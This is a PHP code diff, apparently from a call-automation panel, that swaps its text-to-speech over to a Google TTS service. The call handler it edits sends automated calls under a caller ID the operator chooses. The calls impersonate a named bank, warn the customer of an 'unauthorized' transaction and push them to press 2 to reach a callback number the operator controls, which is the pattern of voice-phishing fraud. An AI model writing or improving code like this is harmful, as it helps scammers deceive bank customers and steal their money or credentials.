@@ -5,6 +5,7 @@ use Illuminate\Database\Capsule\Manager as DB;
 use inc\classes\CSRFToken;
 use inc\classes\RKValidator as Validator;
 use Controller\MagnusBilling;
+use \inc\classes\GoogleTTS\GoogleTTSService;
 
 // Start output buffering to prevent unwanted output
 ob_start();
@@ -636,44 +637,66 @@ switch ($action) {
             }
 
             $tts_script = "Hello, this is $institution_name calling for $customer_name regarding a security matter with your account. We’ve detected a recent transaction of $$amount at $merchant_name that may be unauthorized. If you recognize and authorized this transaction, please press 1. If you did not authorize this transaction or would like to speak with a representative, please press 2 now. To repeat this message, press 3.";
-            $callData = [
-                'destination' => 'custom-ivr-call,s,1',
-                'callerid' => $caller_id,
-                'callback' => $callback_destination,
-                'id_user' => $magnusBilling->getId('user', 'firstname', $user['username']),
-                'ivr_id' => $magnus_ivr_id,
-                'customer_number' => $customer_number,
-                'tts_script' => $tts_script
-            ];
-            $result = $magnusBilling->create('call', $callData);
-            if (!isset($result['success']) || !$result['success']) {
-                echo json_encode(['success' => false, 'message' => 'Failed to initiate call: ' . ($result['error'] ?? 'Unknown error')]);
-                error_log("MagnusBilling API Error (initiate_call): " . json_encode($result));
-                break;
+            // google tts api
+            $googleTTS = new GoogleTTSService;
+            $ssml_script = $googleTTS->buildSSML($institution_name, $customer_name, $amount, $merchant_name);
+            try {
+                $synthesize = $googleTTS->synthesize($ssml_script);
+                if ($synthesize) {
+                    $tts_audio_url = $googleTTS->getFileURL();
+                    // close the google tts
+                    $googleTTS->close();
+                    // call data
+                    $callData = [
+                        'destination' => 'custom-ivr-call,s,1',
+                        'callerid' => $caller_id,
+                        'callback' => $callback_destination,
+                        'id_user' => $magnusBilling->getId('user', 'firstname', $user['username']),
+                        'ivr_id' => $magnus_ivr_id,
+                        'customer_number' => $customer_number,
+                        'tts_script' => $tts_script,
+                        'tts_audio_url' =>$tts_audio_url
+                    ];
+                    $result = $magnusBilling->create('call', $callData);
+                    if (!isset($result['success']) || !$result['success']) {
+                        echo json_encode(['success' => false, 'message' => 'Failed to initiate call: ' . ($result['error'] ?? 'Unknown error')]);
+                        error_log("MagnusBilling API Error (initiate_call): " . json_encode($result));
+                        break;
+                    }
+
+                    $magnus_call_id = $result['id'] ?? DB::getPdo()->lastInsertId();
+
+                    $call_id = DB::table('calls')->insertGetId([
+                        'user_id' => $user_id,
+                        'customer_number' => $customer_number,
+                        'caller_id' => $caller_id,
+                        'callback_method' => $callback_method,
+                        'callback_number' => $callback_destination,
+                        'magnus_call_id' => $magnus_call_id,
+                        'institution_name' => $institution_name,
+                        'merchant_name' => $merchant_name,
+                        'amount' => $amount,
+                        'tts_script' => (string) $tts_script . "\n\n tts_audio_url:" .$tts_audio_url
+                    ]);
+
+                    if ((bool) $call_id) {
+                        error_log("Initiated call: call_id=$call_id, magnus_call_id=$magnus_call_id, customer_number=$customer_number, callback_method=$callback_method");
+                        echo json_encode(['success' => true, 'message' => 'Call initiated successfully', 'call_id' => $call_id]);
+                    } else {
+                        error_log("Initiated call failed: call_id=$call_id, magnus_call_id=$magnus_call_id, customer_number=$customer_number, callback_method=$callback_method");
+                        echo json_encode(['success' => false, 'message' => 'Call initiated false', 'call_id' => $call_id]);
+                    }
+                } else {
+                    echo json_encode(['success' => false, 'message' => 'Failed to TTS synthesize']);
+                    error_log("TTS synthesize failed ");
+                    exit;
+                }
+            } catch (\Throwable $th) {
+                echo json_encode(['success' => false, 'message' => 'Failed to TTS synthesize: ' . $th->getMessage()]);
+                error_log("TTS synthesize error: " . $th->getMessage());
+                exit;
             }
 
-            $magnus_call_id = $result['id'] ?? DB::getPdo()->lastInsertId();
-
-            $call_id = DB::table('calls')->insertGetId([
-                'user_id' => $user_id,
-                'customer_number' => $customer_number,
-                'caller_id' => $caller_id,
-                'callback_method' => $callback_method,
-                'callback_number' => $callback_destination,
-                'magnus_call_id' => $magnus_call_id,
-                'institution_name' => $institution_name,
-                'merchant_name' => $merchant_name,
-                'amount' => $amount,
-                'tts_script' => $tts_script
-            ]);
-
-            if ((bool) $call_id) {
-                error_log("Initiated call: call_id=$call_id, magnus_call_id=$magnus_call_id, customer_number=$customer_number, callback_method=$callback_method");
-                echo json_encode(['success' => true, 'message' => 'Call initiated successfully', 'call_id' => $call_id]);
-            } else {
-                error_log("Initiated call failed: call_id=$call_id, magnus_call_id=$magnus_call_id, customer_number=$customer_number, callback_method=$callback_method");
-                echo json_encode(['success' => false, 'message' => 'Call initiated false', 'call_id' => $call_id]);
-            }
         } catch (Exception $e) {
             echo json_encode(['success' => false, 'message' => 'Failed to initiate call: ' . $e->getMessage()]);
             error_log("Initiate call error: " . $e->getMessage());
@@ -1167,12 +1190,6 @@ switch ($action) {
         }
 
         break;
-
-    case 'tts':
-        $tts = new Inc\Classes\TTS\VoiceRssTextToSpeech;
-        $output = $tts->synthesize("hello world, im thimira dilshan");
-        echo $output;
-
 
     default:
         echo json_encode(['success' => false, 'message' => 'Invalid action']);
